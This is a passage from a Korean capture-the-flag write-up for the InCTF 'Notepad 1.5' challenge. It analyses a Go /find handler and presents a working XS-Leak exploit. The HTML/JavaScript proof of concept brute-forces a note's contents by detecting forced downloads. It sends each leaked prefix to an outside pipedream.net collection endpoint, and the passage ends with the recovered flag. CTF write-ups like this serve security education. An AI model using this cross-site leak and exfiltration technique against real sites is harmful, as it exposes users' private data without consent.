</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">headerSetter</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">cType</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintf</span>(<span style="color:#a6e22e">w</span>, <span style="color:#a6e22e">responseee</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>/find</code> 기능은 사용자가 저장한 메모가 존재하는 지 없는 지 찾은 후에, 존재/미존재를 분기로 처리하는 로직입니다.</p>
<ul>
<li>Information</li>
</ul>
<ol>
<li>condition 값을 가져와서 str 변수에 저장합니다.</li>
<li>만약 에러가 났다면 which 변수에 <code>&quot;any&quot;</code>라는 문자열을 넣어주고, 에러가 나지 않았다면 우리가 입력한 condition의 값을 which에 넣어줍니다.</li>
<li>startsWith 값을 가져와서 str 변수에 저장합니다.</li>
<li>에러가 나지 않았다면 <code>strings.HasPrefix()</code> 메서드를 이용해서 <code>startsWith</code> 값을 x의 값과 비교하는 것을 볼 수 있습니다. ( 이때 x의 값은 현재 사용자가 저장한 노트 값이고, <code>strings.HasPrefix()</code> 메서드는 자바스크립트에서 includes()와 동일 합니다. )</li>
<li>endsWith 값을 가져와서 str 변수에 저장합니다.</li>
<li>에러가 나지 않았다면 <code>strings.HasSuffix()</code> 메서드를 이용해서 <code>endsWith</code> 값을 x의 값과 비교하는 것을 볼 수 있습니다. ( 이때 x의 값은 현재 사용자가 저장한 노트 값이고, <code>strings.HasSuffix()</code> 메서드는 자바스크립트에서 includes()와 동일 하지만 뒤에서부터 검사합니다. )</li>
<li>start/end 로직이 끝나면 여러 분기 별로 처리하는 것을 볼 수 있는데, 이때 모든 분기와 일치하지 않는 다면 debug 값을 가져와서 _와 present에 넣는 것을 볼 수 있습니다. 이때 present에는 true가 들어갑니다.</li>
<li>presend의 값이 true 이면 <code>debug</code>, <code>startWith</code>, <code>endsWith</code>, <code>condition</code> 파라미터를 모두 지우고, 다른 파라미터가 있다면 해당 파라미터를 기반으로 <code>Header()</code> 메서드를 이용해서 응답 헤더를 설정하는 것을 볼 수 있습니다.</li>
<li>모든 처리가 끝나면 <code>headerSetter()</code> 함수를 이용해서 응답 헤더를 설정하고, Fprintf() 함수를 이용해서 출력하는 것을 볼 수 있습니다.</li>
</ol>
<p>여기서 중요한 부분은 우리가 입력한 값과 노트의 값이 일치 하지 않으면 else 문 내부에 들어가는데, 여기서 응답 헤더 하나를 우리가 설정할 수 있다는 것 입니다. 우린 아까 위에서 <code>Download Trigger</code>에 대해서 배웠는데, 엔드포인트에서 <code>Content-Disposition: attachment</code> 헤더를 설정해서 반환하면 브라우저는 첨부 파일을 탐색하고 파일을 설치 한다는 것을 배웠습니다.</p>
<p>그럼 우리가 입력한 값과 노트의 값이 일치 하지 않을 때는 <code>Content-Disposition: attachment</code> 헤더를 설정해 파일이 다운로드 되게 하고, 우리가 입력한 값과 노트의 값이 일치하면 파일은 다운로드 하지 않게 만들 수 있고, 이를 이용하면 XS-Leak 공격을 이용해 노트 값을 파악할 수 있습니다.</p>
<p>그러므로 봇을 이용해 <code>/find</code>로 요청을 보내면 <code>id</code> 값은 관리자의 <code>id</code> 이므로 노트의 값으로 플래그가 들어올 것 이고, 이를 XS-Leak 공격을 이용해서 플래그를 획득할 수 있습니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/129488305-9cb0ce17-2495-4db8-8b46-bd82eb8ba3c3.png" alt="image"></p>
<p>분석한 <code>/find</code> 로직을 확인하기 위해 위와 같이 메모를 작성했습니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/129488320-fbd08b0b-ff14-4b85-ae4c-007499638885.png" alt="image">
<img src="https://user-images.githubusercontent.com/49112423/129488348-72e7814b-8385-40fa-b007-56cf503173c3.png" alt="image"></p>
<p>확인을 해보니 입력값과 노트 값이 일치하면 노트 값이 출력이 되고, 일치 하지 않으면 파일이 다운로드 되는 것을 확인할 수 있었습니다. 이제 이를 이용해 플래그를 획득하면 될 거 같습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">title</span>&gt;Notepad 1.5 - Arthur&#39;s Article Poc&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">string</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz1234567890~}{!@$%^*)(_+&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;inctf{&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">xs</span>(<span style="color:#a6e22e">flag</span>, <span style="color:#a6e22e">str</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`http://chall.notepad15.gq:1515/find?condition=starts&amp;debug&amp;Content-Disposition=attachment&amp;startsWith=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">flag</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">str</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">MyWindow</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#a6e22e">url</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">try</span>{
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">MyWindow</span>.<span style="color:#a6e22e">origin</span>;
</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">err</span>) {
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">flag</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">str</span>;
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">flag</span>)
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">broute_force</span>(<span style="color:#a6e22e">flag</span>);
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }, <span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">broute_force</span>(<span style="color:#a6e22e">flag</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> ( <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">string</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">xs</span>(<span style="color:#a6e22e">flag</span>, <span style="color:#a6e22e">string</span>[<span style="color:#a6e22e">i</span>])
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">broute_force</span>(<span style="color:#a6e22e">flag</span>);
</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/49112423/129514189-90b0699c-6f47-47b7-b49d-68fe1dd7a614.png" alt="image"></p>
<p>위와 같이 익스플로잇 코드를 작성 후에 봇으로 넘겨주니 위와 같이 플래그를 뽑을 수 있었습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG : inctf{red_dead_rezoday_ialmvwoawpwe}
</span></span></code></pre></div>
      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>








  
</div>

</body>
</html>
